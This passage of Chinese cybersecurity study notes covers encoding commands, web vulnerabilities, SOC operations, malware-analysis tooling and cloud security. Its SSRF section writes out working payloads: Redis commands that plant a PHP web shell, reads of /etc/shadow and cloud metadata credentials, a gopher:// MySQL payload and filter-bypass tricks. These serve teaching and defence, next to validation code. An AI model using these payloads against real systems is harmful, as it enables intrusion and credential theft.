```

---

## HTML 实体编码

**基本写法：HTML 实体编码**
`python3 -c "import html; print(html.escape('<字符串>'))"`
```bash
# HTML 实体编码
python3 -c "import html; print(html.escape('<script>alert(1)</script>'))"
```

**基本写法：HTML 实体解码**
`python3 -c "import html; print(html.unescape('<字符串>'))"`
```bash
# HTML 实体解码
python3 -c "import html; print(html.unescape('&lt;script&gt;alert(1)&lt;/script&gt;'))"
```

**基本写法：数字 HTML 实体**
`python3 -c "print(''.join(f'&#%d;' % ord(c) for c in '<字符串>'))"`
```bash
# 转换为数字 HTML 实体
python3 -c "print(''.join(f'&#%d;' % ord(c) for c in '<script>'))"
```

---

## ROT13 编码

**基本写法：ROT13 编码**
`echo "<字符串>" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
```bash
# ROT13 编码（编码解码相同）
echo "hello world" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**基本写法：Python ROT13**
`python3 -c "import codecs; print(codecs.encode('<字符串>', 'rot13'))"`
```bash
# Python ROT13 编码
python3 -c "import codecs; print(codecs.encode('hello world', 'rot13'))"
```

---

## ASCII 编码

**基本写法：字符转 ASCII 码**
`python3 -c "print([ord(c) for c in '<字符串>'])"`
```bash
# 字符串转 ASCII 码列表
python3 -c "print([ord(c) for c in 'hello'])"
```

**基本写法：ASCII 码转字符**
`python3 -c "print(''.join(chr(n) for n in [<码1>, <码2>]))"`
```bash
# ASCII 码列表转字符串
python3 -c "print(''.join(chr(n) for n in [104, 101, 108, 108, 111]))"
```

**基本写法：查看字符 ASCII 码**
`printf '%d\n' "'<字符>"`
```bash
# 查看字符的 ASCII 码
printf '%d\n' "'A"
```

---

## 字符串与字节转换

**基本写法：字符串转字节**
`python3 -c "print(b'<字符串>')"`
```bash
# 字符串转字节
python3 -c "print(b'hello')"
```

**基本写法：字节转字符串**
`python3 -c "print(b'<字节>'.decode())"`
```bash
# 字节转字符串
python3 -c "print(b'hello'.decode())"
```

**基本写法：查看二进制表示**
`echo -n "<字符串>" | xxd -b`
```bash
# 查看字符串的二进制表示
echo -n "A" | xxd -b
```

---

## Unicode 编码

**基本写法：Unicode 转义**
`python3 -c "print('<字符串>'.encode('unicode_escape').decode())"`
```bash
# 字符串转 Unicode 转义
python3 -c "print('你好'.encode('unicode_escape').decode())"
```

**基本写法：Unicode 解码**
`python3 -c "print('<转义>'.encode().decode('unicode_escape'))"`
```bash
# Unicode 转义转字符串
python3 -c "print('\\u4f60\\u597d'.encode().decode('unicode_escape'))"
```

**基本写法：查看字符 Unicode 码点**
`python3 -c "print(hex(ord('<字符>')))"`
```bash
# 查看字符的 Unicode 码点
python3 -c "print(hex(ord('你')))"
```

---

## 多种编码组合

**基本写法：Base64 后十六进制**
`echo -n "<字符串>" | base64 | xxd -p`
```bash
# 先 Base64 编码再转十六进制
echo -n "hello" | base64 | xxd -p
```

**基本写法：十六进制后 Base64**
`echo -n "<字符串>" | xxd -p | base64`
```bash
# 先十六进制编码再 Base64
echo -n "hello" | xxd -p | base64
```

**基本写法：URL 编码后 Base64**
`python3 -c "import urllib.parse, base64; print(base64.b64encode(urllib.parse.quote('<字符串>').encode()).decode())"`
```bash
# URL 编码后再 Base64 编码
python3 -c "import urllib.parse, base64; print(base64.b64encode(urllib.parse.quote('hello world').encode()).decode())"
```

---

## 文件编码检测

**基本写法：检测文件编码**
`file -i <文件>`
```bash
# 检测文件编码类型
file -i document.txt
```

**基本写法：转换文件编码**
`iconv -f <原编码> -t <目标编码> <文件> -o <输出>`
```bash
# 将 GBK 转换为 UTF-8
iconv -f GBK -t UTF-8 input.txt -o output.txt
```

**基本写法：查看文件十六进制**
`hexdump -C <文件> | head`
```bash
# 查看文件十六进制内容
hexdump -C binary.bin | head -20
```

**基本写法：查看文件二进制**
`xxd <文件> | head`
```bash
# 查看文件二进制内容
xxd binary.bin | head -20
```

---

## 实用编码工具

**基本写法：CyberChef 命令行替代**
`python3 -c "import base64; print(base64.b64decode('<Base64>').hex())"`
```bash
# Base64 解码后转十六进制
python3 -c "import base64; print(base64.b64decode('aGVsbG8=').hex())"
```

**基本写法：批量 Base64 解码**
`while read line; do echo "$line" | base64 -d; done < <文件>`
```bash
# 批量解码文件中的 Base64
while read line; do echo "$line" | base64 -d 2>/dev/null; echo; done < b64list.txt
```

**基本写法：检测编码类型**
`python3 -c "import chardet; print(chardet.detect(open('<文件>','rb').read()))"`
```bash
# 使用 chardet 检测文件编码
python3 -c "import chardet; print(chardet.detect(open('file.txt','rb').read()))"
```



<!-- ============ 文档分隔线：033-cybersecurity/009-WebSecurityDeep.md ============ -->



## 1. SQL 注入

### 1.1 注入类型

| 类型     | 说明          |
| -------- | ------------- |
| 联合查询 | UNION SELECT  |
| 报错注入 | 利用错误信息  |
| 盲注     | 布尔/时间盲注 |
| 堆叠注入 | 多语句执行    |

### 1.2 防御

- 参数化查询（预编译）
- 输入验证
- 最小权限
- WAF

## 2. XSS

### 2.1 类型

| 类型   | 说明        |
| ------ | ----------- |
| 反射型 | URL参数注入 |
| 存储型 | 持久化存储  |
| DOM型  | 客户端渲染  |

### 2.2 防御

- 输出编码
- CSP（Content Security Policy）
- HttpOnly Cookie
- 输入验证

## 3. CSRF

### 3.1 攻击原理

```
用户已登录A网站
→ 访问恶意网站B
→ B自动发送请求到A
→ A认为是用户操作
```

### 3.2 防御

- CSRF Token
- SameSite Cookie
- 验证 Referer/Origin
- 双重Cookie验证

## 4. SSRF

### 4.1 攻击场景

- 访问内网服务
- 读取本地文件
- 云元数据获取凭证

### 4.2 防御

- URL白名单
- 禁止内网地址
- 限制协议（仅HTTP/HTTPS）
- 网络隔离

## 5. JWT 安全

### 5.1 常见漏洞

| 漏洞        | 说明         |
| ----------- | ------------ |
| 算法None    | 删除签名     |
| RS256→HS256 | 公钥作为密钥 |
| 弱密钥      | 暴力破解     |
| 未验证签名  | 忽略验证     |

### 5.2 安全实践

- 使用 RS256/ES256
- 密钥足够长
- 验证签名和声明
- 设置短过期时间
- 不存敏感数据

## 6. API 安全

### 6.1 OWASP API Top 10

| 风险           | 说明         |
| -------------- | ------------ |
| 对象级授权     | 越权访问     |
| 认证失效       | 认证绕过     |
| 对象属性级授权 | 敏感字段暴露 |
| 速率限制       | 无限调用     |
| 功能级授权     | 管理API暴露  |

### 6.2 API 安全措施

- OAuth2/OIDC 认证
- 速率限制
- 输入验证
- 输出过滤
- API 网关
- 审计日志



<!-- ============ 文档分隔线：033-cybersecurity/010-SOC.md ============ -->



## 1. SOC 概述

### 1.1 SOC 职能

| 职能 | 说明           |
| ---- | -------------- |
| 监控 | 7×24 安全监控  |
| 检测 | 发现安全事件   |
| 分析 | 事件分类和研判 |
| 响应 | 应急处置       |
| 报告 | 安全态势报告   |

### 1.2 SOC 成熟度

| 级别 | 特征                   |
| ---- | ---------------------- |
| L1   | 基础监控，人工响应     |
| L2   | 规则化检测，半自动响应 |
| L3   | 威胁狩猎，自动化编排   |
| L4   | 主动防御，AI辅助       |

## 2. SIEM

### 2.1 核心功能

- 日志采集和归一化
- 关联分析
- 告警生成
- 取证搜索
- 合规报告

### 2.2 关联规则

```
规则：5分钟内同一IP登录失败5次 + 成功登录
→ 可能是暴力破解成功
```

### 2.3 常见 SIEM

| 产品         | 特点             |
| ------------ | ---------------- |
| Splunk       | 功能最全，价格高 |
| Elastic SIEM | 开源基础         |
| QRadar       | IBM，AI分析      |
| Sentinel     | 微软云原生       |

## 3. SOAR

### 3.1 安全编排自动化

将安全操作流程自动化：

```
告警 → 富化（查询威胁情报）→ 分类 → 响应（封禁IP/隔离主机）
```

### 3.2 Playbook 示例

```yaml
name: 暴力破解响应
trigger: alert.type == "brute_force"
steps:
  - action: enrich
    query: whois {{source_ip}}
  - action: check
    query: threat_intel {{source_ip}}
  - condition: is_malicious
    true:
      - action: block_ip
        firewall: edge
        ip: { { source_ip } }
      - action: notify
        channel: security-team
    false:
      - action: close_alert
        reason: false_positive
```

## 4. 威胁情报

### 4.1 情报类型

| 类型 | 说明     | 示例           |
| ---- | -------- | -------------- |
| 战略 | 宏观趋势 | APT组织分析    |
| 战术 | TTP      | 攻击手法       |
| 技术 | IOC指标  | 恶意IP/域名    |
| 运营 | 具体威胁 | 正在进行的攻击 |

### 4.2 MITRE ATT&CK 应用

- 映射检测规则到ATT&CK
- 识别覆盖盲区
- 评估防御能力

## 5. 事件响应

### 5.1 响应流程

```
准备 → 检测 → 遏制 → 根除 → 恢复 → 复盘
```

### 5.2 事件分级

| 级别 | 响应时间 | 示例               |
| ---- | -------- | ------------------ |
| P1   | 15分钟   | 勒索软件、数据泄露 |
| P2   | 1小时    | 恶意软件、入侵     |
| P3   | 4小时    | 钓鱼、异常访问     |
| P4   | 24小时   | 策略违规           |

## 6. 安全度量

| 指标   | 计算                    |
| ------ | ----------------------- |
| MTTD   | 平均检测时间            |
| MTTR   | 平均响应时间            |
| 误报率 | 误报/总告警             |
| 事件数 | 按月/季统计             |
| 覆盖率 | 已覆盖ATT&CK技术/总技术 |



<!-- ============ 文档分隔线：033-cybersecurity/011-SSRFAttack.md ============ -->



## 1. SSRF 攻击原理

### 1.1 什么是 SSRF

服务端请求伪造（Server-Side Request Forgery, SSRF）是攻击者利用服务器发起请求的功能，使服务器向攻击者指定的目标发起请求，从而访问内网资源或进行内网探测。

### 1.2 攻击流程

```
1. 攻击者构造恶意 URL → 提交给服务器
2. 服务器未验证 URL → 发起请求
3. 服务器获取内网资源 → 返回给攻击者
4. 攻击者获取内网信息/访问内部服务
```

### 1.3 与 CSRF 的区别

| 对比项     | SSRF           | CSRF         |
| ---------- | -------------- | ------------ |
| 请求发起方 | 服务器         | 用户浏览器   |
| 攻击目标   | 内网服务       | 外部用户操作 |
| 核心利用   | 服务器网络位置 | 用户认证状态 |

## 2. SSRF 利用场景

### 2.1 内网探测

```
# 探测内网 IP
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# 探测端口
http://internal-server:6379  # Redis
http://internal-server:3306  # MySQL
http://internal-server:9200  # Elasticsearch
```

### 2.2 读取本地文件

```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
```

### 2.3 攻击内网服务

**攻击 Redis**：

```
# 通过 SSRF 向 Redis 发送命令
dict://internal-redis:6379/CONFIG SET dir /var/www/html
dict://internal-redis:6379/CONFIG SET dbfilename shell.php
dict://internal-redis:6379/SET payload "<?php system($_GET['cmd']); ?>"
dict://internal-redis:6379/SAVE
```

**攻击云元数据**：

```
# AWS 元数据
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP 元数据
http://metadata.google.internal/computeMetadata/v1/

# Azure 元数据
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 2.4 协议利用

| 协议        | 用途                |
| ----------- | ------------------- |
| `http://`   | 内网探测、服务攻击  |
| `https://`  | 同 HTTP             |
| `file://`   | 读取本地文件        |
| `dict://`   | 攻击 Redis 等       |
| `gopher://` | 构造任意 TCP 数据包 |
| `ftp://`    | FTP 服务探测        |

**Gopher 协议**：

```
# 构造 MySQL 查询
gopher://internal-mysql:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00
```

## 3. SSRF 绕过技术

### 3.1 IP 限制绕过

| 方法         | 示例                                 |
| ------------ | ------------------------------------ |
| 十进制 IP    | `0x7f000001` = `127.0.0.1`           |
| 八进制 IP    | `0177.0.0.1` = `127.0.0.1`           |
| IPv6         | `[::1]` = `127.0.0.1`                |
| 短地址       | `http://t.cn/xxx`                    |
| DNS 重绑定   | 域名先解析为外网 IP，再解析为内网 IP |
| URL 解析差异 | `http://evil.com#@internal.com`      |

### 3.2 DNS 重绑定攻击

```
1. 攻击者控制域名 rebinding.attacker.com
2. 首次解析 → 外网 IP（通过验证）
3. 二次解析 → 内网 IP（实际请求目标）
4. TTL 设为 0，确保快速切换
```

### 3.3 开放重定向绕过

```
# 利用合法网站的重定向功能
http://trusted-site.com/redirect?url=http://internal-server
```

## 4. SSRF 防御

### 4.1 URL 白名单

```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

def validate_url(url):
    parsed = urlparse(url)

    # 仅允许 HTTP/HTTPS
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Only HTTP/HTTPS allowed")

    # 域名白名单
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")

    return url
```

### 4.2 禁用危险协议

```python
# 仅允许 http 和 https
if not url.startswith(('http://', 'https://')):
    raise ValueError("Invalid protocol")
```

### 4.3 内网 IP 过滤

```python
import ipaddress

def is_internal_ip(ip_str):
    ip = ipaddress.ip_address(ip_str)
    internal_ranges = [
        ipaddress.ip_network('10.0.0.0/8'),
        ipaddress.ip_network('172.16.0.0/12'),
        ipaddress.ip_network('192.168.0.0/16'),
        ipaddress.ip_network('127.0.0.0/8'),
        ipaddress.ip_network('169.254.0.0/16'),
        ipaddress.ip_network('::1/128'),
        ipaddress.ip_network('fc00::/7'),
    ]
    return any(ip in net for net in internal_ranges)
```

### 4.4 DNS 解析后验证

```python
import socket

def safe_request(url):
    parsed = urlparse(url)
    hostname = parsed.hostname

    # DNS 解析后检查实际 IP
    ip = socket.gethostbyname(hostname)
    if is_internal_ip(ip):
        raise ValueError("Internal IP not allowed")

    # 使用解析后的 IP 发起请求
    # 防止 DNS 重绑定
```

### 4.5 网络层防御

| 措施         | 描述                   |
| ------------ | ---------------------- |
| 防火墙规则   | 禁止应用服务器访问内网 |
| VPC 网络隔离 | 应用层与数据层分离     |
| 出站代理     | 限制出站请求目标       |
| 云安全组     | 限制元数据访问         |

## 5. SSRF 检测

### 5.1 测试方法

```
# 基础探测
http://127.0.0.1
http://localhost
http://[::1]

# 云元数据
http://169.254.169.254/latest/meta-data/

# 文件读取
file:///etc/passwd

# 时间差异探测
http://192.168.1.1:80  (开放 → 快速响应)
http://192.168.1.1:81  (关闭 → 超时)
```

### 5.2 自动化工具

| 工具       | 特点                    |
| ---------- | ----------------------- |
| SSRFmap    | 自动化 SSRF 利用        |
| Gopherus   | 生成 Gopher Payload     |
| Burp Suite | 手动测试与 Collaborator |



<!-- ============ 文档分隔线：033-cybersecurity/012-MalwareAnalysis.md ============ -->


## 1. 恶意软件分类

### 1.1 按行为分类

| 类型     | 行为         | 示例         |
| -------- | ------------ | ------------ |
| 病毒     | 感染宿主文件 | CIH          |
| 蠕虫     | 自我传播     | WannaCry     |
| 木马     | 伪装合法软件 | Emotet       |
| 勒索软件 | 加密勒索     | Ryuk         |
| Rootkit  | 隐藏自身     | Sony Rootkit |
| RAT      | 远程控制     | Gh0st        |

### 1.2 按目标分类

| 类型     | 目标     | 示例    |
| -------- | -------- | ------- |
| 银行木马 | 网银     | Zeus    |
| 勒索软件 | 数据     | LockBit |
| 间谍软件 | 信息     | Pegasus |
| 僵尸网络 | 控制     | Mirai   |
| APT      | 持续渗透 | Stuxnet |

## 2. 静态分析

### 2.1 文件特征

```bash
# 文件类型
file malware.exe

# 哈希
sha256sum malware.exe

# 字符串提取
strings malware.exe | grep -i "http\|password\|key"

# PE头分析
python pefile.py malware.exe
```

### 2.2 反汇编

| 工具         | 说明       |
| ------------ | ---------- |
| IDA Pro      | 专业反汇编 |
| Ghidra       | NSA开源    |
| Radare2      | 命令行     |
| Binary Ninja | 现代       |

### 2.3 签名检测

```bash
# YARA 规则
rule Malware_Detector {
    meta:
        description = "Detects known malware"
    strings:
        $s1 = "cmd.exe /c" ascii
        $s2 = { 6A 40 68 00 30 00 00 }
    condition:
        any of them
}
```

## 3. 动态分析

### 3.1 沙箱分析

| 沙箱            | 特点   |
| --------------- | ------ |
| Cuckoo Sandbox  | 开源   |
| Joe Sandbox     | 商业   |
| ANY.RUN         | 交互式 |
| Hybrid Analysis | 在线   |

### 3.2 行为监控

```bash
# 进程监控
Process Monitor (ProcMon)

# 网络监控
Wireshark / tcpdump

# 注册表监控
Regshot

# API 调用追踪
API Monitor
```

### 3.3 网络行为分析

- DNS 请求
- HTTP/HTTPS 通信
- C2 通信模式
- 数据外传

## 4. 逆向工程

### 4.1 脱壳

| 壳        | 工具     |
| --------- | -------- |
| UPX       | upx -d   |
| Themida   | 手动脱壳 |
| VMProtect | 困难     |
| ASPack    | 脱壳工具 |

### 4.2 调试

```bash
# x64dbg 调试
1. 设置断点
2. 单步执行
3. 查看寄存器和内存
4. 分析算法逻辑
```

### 4.3 反混淆

- 字符串解密
- 控制流还原
- API 调用恢复

## 5. 勒索软件分析

### 5.1 常见勒索软件家族

| 家族     | 加密算法    | 特点            |
| -------- | ----------- | --------------- |
| WannaCry | AES+RSA     | 利用EternalBlue |
| Ryuk     | AES-256     | 针对性攻击      |
| LockBit  | AES+RSA     | RaaS模式        |
| Conti    | ChaCha8+RSA | 双重勒索        |

### 5.2 分析要点

- 加密算法和密钥管理
- 文件扩展名修改
- 勒索信内容
- C2 通信方式
- 是否可解密

## 6. 威胁情报生产

### 6.1 IOC 提取

| IOC类型  | 示例     |
| -------- | -------- |
| 文件哈希 | SHA256   |
| IP地址   | C2服务器 |
| 域名     | DGA域名  |
| URL      | 下载地址 |
| 互斥量   | 运行标识 |
| 注册表键 | 持久化   |

### 6.2 情报共享

- STIX/TAXII 标准
- MISP 平台
- OpenIOC 格式
## 静态分析基础

**基本写法:文件类型识别**
`file <文件>`
```bash
# 识别恶意软件文件类型
file suspicious.exe
```

**基本写法:计算文件哈希**
`sha256sum <文件>`
```bash
# 计算文件 SHA256 哈希用于查重
sha256sum suspicious.exe
```

**基本写法:计算 MD5 哈希**
`md5sum <文件>`
```bash
# 计算 MD5 哈希便于查询
md5sum suspicious.exe
```

**基本写法:提取可打印字符串**
`strings <文件> | head -50`
```bash
# 提取文件中的可读字符串
strings suspicious.exe | head -50
```

**基本写法:提取长字符串**
`strings -n 10 <文件>`
```bash
# 提取长度超过 10 的字符串
strings -n 10 suspicious.exe
```

**基本写法:查看文件大小**
`ls -la <文件>`
```bash
# 查看文件大小与权限
ls -la suspicious.exe
```

---

## YARA 规则匹配

**基本写法:扫描文件**
`yara <规则文件> <目标文件>`
```bash
# 使用 YARA 规则扫描恶意软件
yara malware_rules.yar suspicious.exe
```

**基本写法:递归扫描目录**
`yara -r <规则文件> <目录>`
```bash
# 递归扫描目录下所有文件
yara -r malware_rules.yar /malware_samples/
```

**基本写法:显示匹配的规则**
`yara -s <规则文件> <目标文件>`
```bash
# 显示匹配规则与匹配字符串
yara -s malware_rules.yar suspicious.exe
```

**基本写法:使用多个规则文件**
`yara -r <规则目录> <目标文件>`
```bash
# 使用规则目录中所有规则文件
yara -r /rules/ suspicious.exe
```

**基本写法:编译规则加速扫描**
`yarac <规则文件> <编译文件>`
```bash
# 预编译规则提高扫描速度
yarac malware_rules.yar compiled.yarc
yara compiled.yarc suspicious.exe
```

---

## VirusTotal 查询

**基本写法:使用 API 查询哈希**
`curl "https://www.virustotal.com/api/v3/files/<哈希>"`
```bash
# 通过哈希查询 VirusTotal 报告
curl -H "x-apikey: <API_KEY>" "https://www.virustotal.com/api/v3/files/abc123"
```

**基本写法:上传文件扫描**
`curl -X POST "https://www.virustotal.com/api/v3/files" -F "file=@<文件>"`
```bash
# 上传文件到 VirusTotal 扫描
curl -X POST -H "x-apikey: <API_KEY>" "https://www.virustotal.com/api/v3/files" -F "file=@suspicious.exe"
```

**基本写法:获取分析结果**
`curl "https://www.virustotal.com/api/v3/analyses/<分析ID>"`
```bash
# 获取上传文件的分析结果
curl -H "x-apikey: <API_KEY>" "https://www.virustotal.com/api/v3/analyses/analysis_id"
```

**基本写法:使用 vt-cli 工具**
`vt scan file <文件>`
```bash
# 使用 VirusTotal CLI 工具扫描
vt scan file suspicious.exe
```

**基本写法:查询文件信息**
`vt file <哈希>`
```bash
# 查询文件详细信息
vt file abc123def456
```

---

## 沙箱分析

**基本写法:使用 Cuckoo 沙箱**
`cuckoo submit <文件>`
```bash
# 提交文件到 Cuckoo 沙箱分析
cuckoo submit suspicious.exe
```

**基本写法:指定分析选项**
`cuckoo submit --options <选项> <文件>`
```bash
# 指定分析机器与超时
cuckoo submit --options timeout=300,machine=win10 suspicious.exe
```

**基本写法:查看分析任务**
`cuckoo tasks list`
```bash
# 列出所有分析任务
cuckoo tasks list
```

**基本写法:查看分析报告**
`cuckoo report <任务ID>`
```bash
# 查看指定任务分析报告
cuckoo report 123
```

**基本写法:导出分析结果**
`cuckoo report <任务ID> -f <格式>`
```bash
# 导出 JSON 格式分析报告
cuckoo report 123 -f json > report.json
```

---

## 动态分析基础

**基本写法:跟踪系统调用**
`strace -f -o <输出文件> <程序>`
```bash
# 跟踪程序所有系统调用
strace -f -o syscall.log ./suspicious
```

**基本写法:跟踪库函数调用**
`ltrace -f -o <输出文件> <程序>`
```bash
# 跟踪库函数调用
ltrace -f -o libcall.log ./suspicious
```

**基本写法:过滤特定系统调用**
`strace -e trace=<调用类型> <程序>`
```bash
# 仅跟踪网络相关系统调用
strace -e trace=network -f ./suspicious
```

**基本写法:跟踪文件操作**
`strace -e trace=file <程序>`
```bash
# 仅跟踪文件相关操作
strace -e trace=file -f ./suspicious
```

**基本写法:跟踪进程创建**
`strace -e trace=process <程序>`
```bash
# 跟踪进程创建相关操作
strace -e trace=process -f ./suspicious
```

---

## 网络行为分析

**基本写法:抓取程序网络流量**
`tcpdump -i any -w <输出文件> & <程序>`
```bash
# 抓取程序运行时的网络流量
sudo tcpdump -i any -w traffic.pcap &
./suspicious
```

**基本写法:分析 DNS 请求**
`tshark -r <PCAP文件> -Y "dns.qry.name"`
```bash
# 分析程序发起的 DNS 请求
tshark -r traffic.pcap -Y "dns.qry.name" -T fields -e dns.qry.name
```

**基本写法:分析 HTTP 请求**
`tshark -r <PCAP文件> -Y "http.request"`
```bash
# 分析程序发出的 HTTP 请求
tshark -r traffic.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
```

**基本写法:统计连接目标**
`tshark -r <PCAP文件> -T fields -e ip.dst | sort | uniq -c`
```bash
# 统计程序连接的目标 IP
tshark -r traffic.pcap -T fields -e ip.dst | sort | uniq -c | sort -rn
```

**基本写法:提取 C2 通信特征**
`tshark -r <PCAP文件> -Y "tcp.port == 443" -T fields -e ip.dst`
```bash
# 提取可能的 C2 服务器地址
tshark -r traffic.pcap -Y "tcp.port == 443" -T fields -e ip.dst | sort -u
```

---

## 文件行为监控

**基本写法:监控文件创建**
`inotifywait -m -r <监控目录>`
```bash
# 实时监控目录中文件创建事件
inotifywait -m -r /tmp -e create,modify,delete
```

**基本写法:使用 auditd 监控**
`auditctl -w <目录> -p war -k malware`
```bash
# 使用审计系统监控目录
sudo auditctl -w /tmp -p war -k malware
```

**基本写法:查看文件创建事件**
`ausearch -k malware`
```bash
# 查询监控到的文件操作
sudo ausearch -k malware
```

**基本写法:监控进程文件操作**
`lsof -p <PID>`
```bash
# 查看进程打开的所有文件
lsof -p 1234
```

**基本写法:持续监控进程文件操作**
`lsof -r -p <PID>`
```bash
# 持续监控进程文件操作变化
lsof -r -p 1234
```

---

## 注册表与配置分析(Windows)

**基本写法:导出注册表快照**
`reg export HKLM <文件>`
```bash
# 导出注册表快照用于对比(Windows 环境)
reg export HKLM\Software hklm_backup.reg
```

**基本写法:对比注册表变化**
`fc <原文件> <新文件>`
```bash
# 对比注册表快照查找修改
fc original.reg modified.reg > changes.txt
```

**基本写法:使用 regripper 分析**
`regripper -r <注册表文件> -f <插件>`
```bash
# 使用 RegRipper 分析注册表文件
regripper -r NTUSER.DAT -f userassist
```

**基本写法:提取自启动项**
`reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"`
```bash
# 查看注册表自启动项
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

**基本写法:查看服务**
`sc query state= all`
```bash
# 查看所有系统服务
sc query state= all
```

---

## 内存分析

**基本写法:使用 vol.py 分析内存**
`vol.py -f <内存镜像> imageinfo`
```bash
# 使用 Volatility 分析内存镜像基本信息
vol.py -f memory.dump imageinfo
```

**基本写法:列出进程**
`vol.py -f <内存镜像> --profile=<配置> pslist`
```bash
# 列出内存中的所有进程
vol.py -f memory.dump --profile=Win10x64 pslist
```

**基本写法:查找隐藏进程**
`vol.py -f <内存镜像> --profile=<配置> psxview`
```bash
# 检测隐藏进程
vol.py -f memory.dump --profile=Win10x64 psxview
```

**基本写法:提取进程内存**
`vol.py -f <内存镜像> --profile=<配置> memdump -p <PID> -D <目录>`
```bash
# 提取指定进程的内存
vol.py -f memory.dump --profile=Win10x64 memdump -p 1234 -D /tmp/
```

**基本写法:扫描网络连接**
`vol.py -f <内存镜像> --profile=<配置> netscan`
```bash
# 扫描内存中的网络连接
vol.py -f memory.dump --profile=Win10x64 netscan
```

---

## 恶意软件脱壳

**基本写法:使用 upx 脱壳**
`upx -d <文件>`
```bash
# 脱壳 UPX 加壳的程序
upx -d packed.exe
```

**基本写法:查看 PE 节区熵**
`python3 -c "import pefile; pe=pefile.PE('<文件>'); ..."`
```bash
# 计算各节区熵值判断是否加壳
python3 -c "
import pefile, math
pe=pefile.PE('suspicious.exe')
for s in pe.sections:
    data=s.get_data()
    ent=-sum(data.count(bytes([b]))/len(data)*math.log2(data.count(bytes([b]))/len(data)) for b in range(256) if data.count(bytes([b])))
    print(f'{s.Name.decode()} 熵值: {ent:.2f}')
"
```

**基本写法:使用 diStorm 反汇编**
`python3 -c "from distorm3 import Decode; ..."`
```bash
# Python 使用 diStorm 反汇编代码
python3 -c "
from distorm3 import Decode
code=b'\\x48\\x89\\xe5'
for ins in Decode(0x1000, code):
    print(ins)
"
```

**基本写法:使用 pefile 查看入口点**
`python3 -c "import pefile; pe=pefile.PE('<文件>'); print(hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))"`
```bash
# 查看 PE 文件入口点判断是否加壳
python3 -c "import pefile; pe=pefile.PE('suspicious.exe'); print('入口点:', hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))"
```

---

## 自动化分析流水线

**基本写法:批量计算哈希**
`for f in <目录>/*; do sha256sum "$f"; done`
```bash
# 批量计算目录中所有文件哈希
for f in /malware/*; do echo "$(sha256sum "$f" | cut -d' ' -f1) $f"; done > hashes.txt
```

**基本写法:批量提取字符串**
`for f in <目录>/*; do echo "=== $f ==="; strings "$f"; done`
```bash
# 批量提取所有样本的字符串
for f in /malware/*; do echo "=== $f ==="; strings -n 8 "$f"; done > all_strings.txt
```

**基本写法:批量 YARA 扫描**
`yara -r -s <规则文件> <目录>`
```bash
# 批量扫描目录下所有文件
yara -r -s /rules/*.yar /malware_samples/ > yara_results.txt
```

**基本写法:自动化分析脚本**
`./analyze.sh <文件>`
```bash
# 自动化分析脚本示例
# #!/bin/bash
# echo "文件类型: $(file -b $1)"
# echo "SHA256: $(sha256sum $1 | cut -d' ' -f1)"
# echo "字符串数: $(strings $1 | wc -l)"
# yara rules.yar $1
```

**基本写法:提交到沙箱批量分析**
`for f in <目录>/*; do cuckoo submit "$f"; done`
```bash
# 批量提交文件到沙箱分析
for f in /malware/*; do cuckoo submit "$f"; sleep 60; done
```



<!-- ============ 文档分隔线：033-cybersecurity/013-CloudSecurity.md ============ -->



## 1. 共享责任模型

### 1.1 责任划分

| 层级     | 云厂商 | 客户       |
| -------- | ------ | ---------- |
| 物理安全 |        | -          |
| 基础设施 |        | -          |
| 网络     |        | 安全组/ACL |
| 操作系统 | -      |            |
| 运行时   | -      |            |
| 应用     | -      |            |
| 数据     | -      |            |

### 1.2 IaaS/PaaS/SaaS 责任

| 模式 | 客户责任   |
| ---- | ---------- |
| IaaS | OS以上     |
| PaaS | 应用和数据 |
| SaaS | 仅数据     |

## 2. CSPM（云安全态势管理）

### 2.1 检查项

| 类别 | 检查项           |
| ---- | ---------------- |
| 身份 | MFA、最小权限    |
| 网络 | 安全组、公开端口 |
| 存储 | 加密、公开访问   |
| 日志 | 审计日志启用     |
| 加密 | 传输/存储加密    |

### 2.2 常见错误配置

| 错误配置        | 风险       |
| --------------- | ---------- |
| S3公开读写      | 数据泄露   |
| 安全组0.0.0.0/0 | 暴露服务   |
| 无MFA           | 账号被入侵 |
| 硬编码凭证      | 凭证泄露   |
| 未加密EBS       | 数据泄露   |

## 3. CWPP（云工作负载保护）

### 3.1 保护层次

```
应用层：WAF、API安全
  ↓
容器层：镜像扫描、运行时保护
  ↓
OS层：HIDS、漏洞管理
  ↓
基础设施：网络策略、加密
```

### 3.2 容器安全

- 镜像扫描（Trivy）
- 运行时保护（Falco）
- 网络策略（NetworkPolicy）
- 安全上下文（SecurityContext）

## 4. 云原生安全

### 4.1 安全左移

| 阶段 | 安全措施          |
| ---- | ----------------- |
| 代码 | SAST、密钥扫描    |
| 构建 | 镜像扫描、签名    |
| 部署 | IaC扫描、策略检查 |
| 运行 | 运行时保护、监控  |

### 4.2 CNAPP

云原生应用保护平台，整合CSPM和CWPP：

- 代码到运行时全生命周期
- 统一安全策略
- 上下文关联分析

## 5. 云合规

### 5.1 合规标准

| 标准     | 适用     |
| -------- | -------- |
| SOC2     | 美国企业 |
| ISO27001 | 全球     |
| GDPR     | 欧盟数据 |
| PCI DSS  | 支付卡   |
| HIPAA    | 医疗     |
| 等保     | 中国     |

### 5.2 合规自动化

- AWS Config Rules
- Azure Policy
- GCP Organization Policy
- OPA/Gatekeeper



<!-- ============ 文档分隔线：033-cybersecurity/014-SymmetricEncryption.md ============ -->



## 1. 对称加密基础

### 1.1 基本概念

对称加密使用**同一密钥**进行加密和解密，核心优势是速度快、效率高。

$$E_K(M) = C, \quad D_K(C) = M$$

